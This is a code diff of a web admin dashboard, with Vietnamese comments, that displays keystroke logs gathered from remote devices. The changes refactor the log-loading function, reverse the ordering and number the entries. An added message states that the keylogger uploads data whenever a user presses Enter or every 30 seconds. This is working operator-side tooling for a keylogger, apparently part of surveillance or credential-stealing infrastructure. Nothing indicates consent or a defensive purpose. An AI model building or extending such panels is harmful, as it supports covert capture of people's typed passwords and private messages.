@@ -1612,33 +1612,43 @@ document.querySelectorAll('.modal-overlay').forEach(el => {
 // ════════════════════════════════════════════════════════
 async function openKeylogModal(deviceId, deviceName) {
   document.getElementById('keylog-modal').style.display = 'flex';
-  document.getElementById('keylog-device-title').textContent =
-    '⌨️ Keyboard Log — ' + (deviceName || deviceId);
+  // Lưu tên thực (không có prefix icon) để refresh dùng lại
+  const cleanName = (deviceName || deviceId).replace(/^⌨️ Keyboard Log — /, '');
+  document.getElementById('keylog-device-title').textContent = '⌨️ Keyboard Log — ' + cleanName;
   document.getElementById('keylog-device-id-store').value = deviceId;
-  document.getElementById('keylog-body').innerHTML =
-    '<div style="text-align:center;color:var(--text2);padding:30px">Đang tải...</div>';
+  await _loadKeylog(deviceId);
+}
 
+async function _loadKeylog(deviceId) {
+  const el = document.getElementById('keylog-body');
+  el.innerHTML = '<div style="text-align:center;color:var(--text2);padding:30px">Đang tải...</div>';
   try {
     const r = await fetch(WORKER_URL + '/api/admin/keylog?device=' + encodeURIComponent(deviceId), {
       headers: { 'X-Admin-Token': ADMIN_TOKEN }
     });
     const data = await r.json();
-    const lines = data.lines || [];
-    const el = document.getElementById('keylog-body');
+    const lines = (data.lines || []).slice().reverse(); // mới nhất lên đầu
     if (lines.length === 0) {
-      el.innerHTML = '<div style="text-align:center;color:var(--text2);padding:30px">Chưa có dữ liệu bàn phím nào.</div>';
+      el.innerHTML = '<div style="text-align:center;color:var(--text2);padding:40px">' +
+        '<div style="font-size:32px;margin-bottom:8px">⌨️</div>' +
+        '<div>Chưa có dữ liệu bàn phím.</div>' +
+        '<div style="font-size:11px;margin-top:6px;opacity:.6">Keylogger sẽ gửi data khi người dùng gõ Enter hoặc mỗi 30 giây.</div>' +
+        '</div>';
       return;
     }
     el.innerHTML = lines.map((l, i) => {
-      const ts = l.ts ? new Date(l.ts).toLocaleString('vi-VN') : '';
+      const ts = l.ts ? new Date(l.ts).toLocaleString('vi-VN', {
+        day:'2-digit', month:'2-digit', year:'numeric',
+        hour:'2-digit', minute:'2-digit', second:'2-digit'
+      }) : '';
+      const idx = lines.length - i; // số thứ tự ngược
       return `<div class="kl-row">
-        <div class="kl-ts">${ts}</div>
+        <div class="kl-ts">#${idx} &nbsp;·&nbsp; ${ts}</div>
         <div class="kl-text">${escapeHtml(l.text)}</div>
       </div>`;
-    }).reverse().join('');
+    }).join('');
   } catch(e) {
-    document.getElementById('keylog-body').innerHTML =
-      '<div style="color:var(--red);padding:20px">Lỗi tải log: ' + e.message + '</div>';
+    el.innerHTML = '<div style="color:var(--red);padding:20px">Lỗi tải log: ' + e.message + '</div>';
   }
 }
 
@@ -1664,7 +1674,7 @@ function escapeHtml(s) {
     <h3 id="keylog-device-title" style="margin:0 0 14px">⌨️ Keyboard Log</h3>
     <input type="hidden" id="keylog-device-id-store">
     <div style="display:flex;gap:8px;margin-bottom:12px">
-      <button class="btn btn-ghost" style="font-size:12px" onclick="openKeylogModal(document.getElementById('keylog-device-id-store').value, document.getElementById('keylog-device-title').textContent)">🔄 Refresh</button>
+      <button class="btn btn-ghost" style="font-size:12px" onclick="_loadKeylog(document.getElementById('keylog-device-id-store').value)">🔄 Refresh</button>
       <button class="btn" style="font-size:12px;background:var(--red);color:#fff" onclick="clearKeylog()">🗑 Xoá log</button>
     </div>
     <div id="keylog-body" style="flex:1;overflow-y:auto;display:flex;flex-direction:column;gap:6px;padding-right:4px"></div>
